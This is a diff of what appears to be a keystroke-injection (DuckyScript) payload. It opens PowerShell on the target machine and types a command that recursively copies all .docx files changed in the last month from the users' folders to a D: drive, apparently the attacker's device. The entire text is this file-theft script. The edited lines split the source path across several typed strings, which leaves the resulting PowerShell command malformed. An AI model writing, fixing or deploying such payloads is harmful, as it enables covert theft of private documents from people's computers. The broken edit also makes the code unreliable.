@@ -7,5 +7,10 @@ STRING powershell
 ENTER
 DELAY 1000
 REM Execute PowerShell code
-STRING $sourceFolder = 'C:\Users'; $destinationFolder = 'D:\'; $startDate = (Get-Date).AddMonths(-1); $endDate = Get-Date; Get-ChildItem -Path $sourceFolder -Recurse -Filter *.docx | Where-Object { $_.LastWriteTime -ge $startDate -and $_.LastWriteTime -le $endDate } | Copy-Item -Destination $destinationFolder -Force
+STRING $sourceFolder = 'C:'
+DELAY 200
+STRING \
+DELAY 200
+STRING Users
+STRING $destinationFolder = 'D:\'; $startDate = (Get-Date).AddMonths(-1); $endDate = Get-Date; Get-ChildItem -Path $sourceFolder -Recurse -Filter *.docx | Where-Object { $_.LastWriteTime -ge $startDate -and $_.LastWriteTime -le $endDate } | Copy-Item -Destination $destinationFolder -Force
 ENTER
